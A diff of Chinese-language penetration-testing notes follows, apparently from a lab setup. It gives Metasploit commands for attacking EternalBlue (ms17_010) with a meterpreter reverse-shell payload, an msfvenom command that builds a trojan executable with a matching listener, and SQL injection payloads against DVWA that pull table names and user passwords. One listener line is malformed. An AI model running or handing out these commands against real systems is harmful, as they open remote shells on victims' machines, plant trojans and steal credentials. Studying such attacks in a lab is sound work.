@@ -2,6 +2,8 @@
 Payload 有效载荷
 options 可选择的事物
 
+sudo su 获取root权限
+ifconfig 看ip地址：192.168.230.131
 
 一，有ip地址直接攻击
 msfconsole：启动metasploit命令行
@@ -11,16 +13,41 @@ search ms17_010:查看永恒之蓝漏洞
 show options：查看配置信息
 2.设置必选项
 set RHOSTS 192.168.1.128                         [*RHOSTS为target host(s)代表你要攻击谁]
-set payload windows/x64/meterpreter/reverse_tcp  [*payload是攻击载荷，就是攻击完成后想干啥,这里是想获取meterpreter]                                               [*meterpreter是metasploit后渗透的神器]
+set payload windows/x64/meterpreter/reverse_tcp  [*payload是攻击载荷，就是攻击完成后想干啥,这里是想获取meterpreter] [*meterpreter是metasploit后渗透的神器]
 set LHOST 192.108.1.136                          [*LHOSTS为listen host 代表你是谁，既Kali的IP地址]
 set LPORT 12345                                  [*LPORT为listen port，代表你要在kali上开启的端口，1-65535随便选，但不能被占用]
 3.run
 4.help：看看怎么控制这台电脑
 
 二，生成木马病毒
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.136 lport=9999 -f exe -o demo9999.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.230.131 lport=9999 -f exe -o demo9999.exe
+配置鱼钩：
+msfconsole：启动metasploit命令行
+use exploit/multi/handler：模块
+options：查看配置信息
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.230.131
+set lport 9999 10.193.19.61
+run
 
 
+三，网站渗透
+
+命令执行漏洞是什么？
+
+命令执行漏洞是指攻击者通过输入恶意代码或者参数，使得应用程序在执行命令时，执行了攻击者想要执行的恶意命令。
+
+这种漏洞通常存在于Web应用程序、网络服务和操作系统等系统中。攻击者可以通过命令执行漏洞来获取系统权限、窃取敏感信息、篡改数据等。
 
 
+sql注入漏洞是什么？
 
+SQL注入漏洞是一种常见的Web应用程序漏洞，攻击者通过向Web应用程序提交恶意的SQL查询语句，从而可以访问或修改应用程序的数据库中的数据。
+
+攻击者可以利用SQL注入漏洞来窃取敏感信息、修改或删除数据，或者在数据库中执行其他恶意操作。
+
+这种漏洞通常是由于Web应用程序没有正确地对用户输入进行验证和过滤而导致的。
+
+1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#
+
+1' union select user,password from users#
